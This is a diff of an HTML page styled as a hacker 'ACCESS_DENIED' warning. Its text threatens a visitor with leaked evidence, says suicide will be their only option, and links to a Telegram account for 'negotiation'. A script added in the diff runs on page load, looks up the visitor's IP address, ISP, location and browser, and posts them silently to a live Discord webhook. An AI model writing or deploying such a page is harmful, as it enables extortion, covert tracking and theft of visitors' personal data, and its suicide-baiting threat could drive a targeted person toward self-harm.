@@ -3,80 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sectors // Faith</title>
+    <title>TERMINAL | ACCESS_DENIED</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body {
-            background-color: #000;
-            color: #ff0000;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-            overflow: hidden;
+        :root {
+            --bg: #050000;
+            --container: #0f0505;
+            --text: #ff3e3e; /* Warning Red */
+            --subtext: #884444;
+            --tele: #0088cc;
         }
 
-        .warning-box {
-            border: 1px solid #ff0000;
-            padding: 40px;
-            max-width: 850px;
-            box-shadow: 0 0 40px rgba(255, 0, 0, 0.6);
-            background: rgba(0, 0, 0, 0.95);
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: left;
+        }
+
+        .warning-card {
+            width: 100%;
+            max-width: 450px;
+            background: var(--container);
+            padding: 30px;
+            border: 2px solid var(--text);
+            position: relative;
+            box-shadow: 0 0 30px rgba(255, 62, 62, 0.2);
         }
 
         h1 {
-            font-size: 1.6rem;
-            letter-spacing: 3px;
-            margin-bottom: 25px;
-            text-decoration: underline;
-            text-transform: uppercase;
-            line-height: 1.4;
-        }
-
-        h2 {
-            font-size: 1.8rem;
+            font-size: 1.1rem;
             margin-bottom: 20px;
-            letter-spacing: 5px;
-        }
-
-        p {
-            font-size: 1.2rem;
-            font-weight: bold;
-            line-height: 1.8;
             text-transform: uppercase;
-            margin: 20px 0;
+            letter-spacing: 2px;
+            border-bottom: 1px solid var(--text);
+            padding-bottom: 10px;
         }
 
-        .blink {
-            animation: blinker 1s linear infinite;
+        .content {
+            font-size: 0.9rem;
+            line-height: 1.8;
+            margin-bottom: 25px;
+            text-transform: uppercase;
         }
 
-        @keyframes blinker {
-            50% { opacity: 0; }
+        .highlight {
+            background: var(--text);
+            color: black;
+            padding: 2px 5px;
+            font-weight: bold;
+        }
+
+        .journey {
+            display: block;
+            margin-top: 30px;
+            font-size: 1.2rem;
+            letter-spacing: 5px;
+            text-align: center;
+            border: 1px solid var(--text);
+            padding: 10px;
+        }
+
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .btn {
+            padding: 15px;
+            text-decoration: none;
+            color: var(--text);
+            border: 1px solid var(--subtext);
+            font-size: 0.75rem;
+            text-align: center;
+            transition: 0.3s;
+        }
+
+        .btn:hover {
+            background: var(--text);
+            color: black;
+        }
+
+        .btn-tele {
+            color: var(--tele);
+            border-color: var(--tele);
+        }
+
+        .btn-tele:hover {
+            background: var(--tele);
+            color: white;
+        }
+
+        #log-status {
+            font-size: 0.6rem;
+            color: var(--subtext);
+            margin-top: 20px;
+            text-align: center;
         }
     </style>
 </head>
 <body>
 
-    <div class="warning-box">
-        <h2>READY TO ACCEPT YOUR FAITH?</h2>
+    <div class="warning-card">
+        <h1>[!] SYSTEM_INTERCEPT_SUCCESS</h1>
         
-        <h1>
-            EVERYTHING TRANSPIRED BECAUSE OF ONE INDIVIDUAL. I HAVE IDENTIFIED YOU, AND I HOLD THE IRREFUTABLE EVIDENCE.
-        </h1>
-        
-        <p>
-            YOU ARE WELL AWARE OF THE CONSEQUENCES SHOULD THIS DATA BE LEAKED. IF THESE FILES ARE PUBLISHED, YOUR ONLY REMAINING OPTION WILL BE TO END IT ALL. YOU UNDERSTAND THIS, DON'T YOU?
-        </p>
+        <div class="content">
+            READY TO ACCEPT YOUR FAITH?<br><br>
+            EVERYTHING TRANSPIRED BECAUSE OF ONE INDIVIDUAL. <span class="highlight">I HAVE IDENTIFIED YOU</span>, AND I HOLD THE IRREFUTABLE EVIDENCE.<br><br>
+            YOU ARE WELL AWARE OF THE CONSEQUENCES SHOULD THIS DATA BE LEAKED. IF THESE FILES ARE PUBLISHED, YOUR ONLY REMAINING OPTION WILL BE TO END IT ALL. <br><br>
+            YOU UNDERSTAND THIS, DON'T YOU?
 
-        <p style="letter-spacing: 8px; font-size: 1.5rem; margin-top: 30px;">
-            HAPPY JOURNEY.
-        </p>
-        
-        <div class="blink">_</div>
+            <span class="journey">HAPPY JOURNEY</span>
+        </div>
+
+        <div class="btn-group">
+            <a href="https://t.me/Database_clawbot" class="btn btn-tele">
+                <i class="fab fa-telegram-plane"></i> INITIALIZE_NEGOTIATION
+            </a>
+            <a href="index.html" class="btn">DISCONNECT</a>
+        </div>
+
+        <div id="log-status">PACKET_CAPTURE: ACTIVE // DISCORD_UPLINK: LIVE</div>
     </div>
 
+    <script>
+        const DISCORD_URL = "https://discord.com/api/webhooks/1494939940243509269/hGaquy2sX0ipF9Cj6VGpeDnXxaqHyptw0aou3SJNxOvXbllHJaLkDrbzbd0KSqk_Ed5E"; 
+
+        async function logVisit() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+
+                const logData = {
+                    embeds: [{
+                        title: "🚨 TARGET_ACCESSED_FAITH_PAGE",
+                        color: 16711680, // High Alert Red
+                        fields: [
+                            { name: "IDENTIFIED_IP", value: `\`${data.ip}\``, inline: true },
+                            { name: "ISP_PROVIDER", value: `\`${data.org}\``, inline: true },
+                            { name: "GEOLOCATION", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: false },
+                            { name: "CLIENT_AGENT", value: navigator.userAgent.substring(0, 100), inline: false }
+                        ],
+                        footer: { text: "RAW.SNIJU EVIDENCE_LOCK" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                await fetch(DISCORD_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(logData)
+                });
+            } catch (e) {}
+        }
+
+        window.onload = logVisit;
+    </script>
 </body>
 </html>
